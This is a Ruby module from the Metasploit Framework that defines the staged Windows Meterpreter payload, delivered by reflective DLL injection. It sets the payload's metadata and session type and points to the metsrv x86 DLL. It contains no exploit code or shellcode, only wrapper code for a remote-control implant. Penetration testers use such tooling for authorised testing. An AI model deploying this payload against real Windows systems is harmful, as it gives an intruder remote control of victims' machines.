##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'msf/core/payload/windows/reflectivedllinject'
require 'msf/base/sessions/meterpreter_x86_win'
require 'msf/base/sessions/meterpreter_options'

###
#
# Injects the meterpreter server DLL via the Reflective Dll Injection payload
#
###

module Metasploit3

  include Msf::Payload::Windows::ReflectiveDllInject
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Windows Meterpreter (Reflective Injection)',
      'Description'   => 'Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged)',
      'Author'        => ['skape','sf'],
      'PayloadCompat' => { 'Convention' => 'sockedi', },
      'License'       => MSF_LICENSE,
      'Session'       => Msf::Sessions::Meterpreter_x86_Win))

    # Don't let people set the library name option
    options.remove_option('LibraryName')
    options.remove_option('DLL')
  end

  def library_path
    MetasploitPayloads.meterpreter_path('metsrv','x86.dll')
  end

end
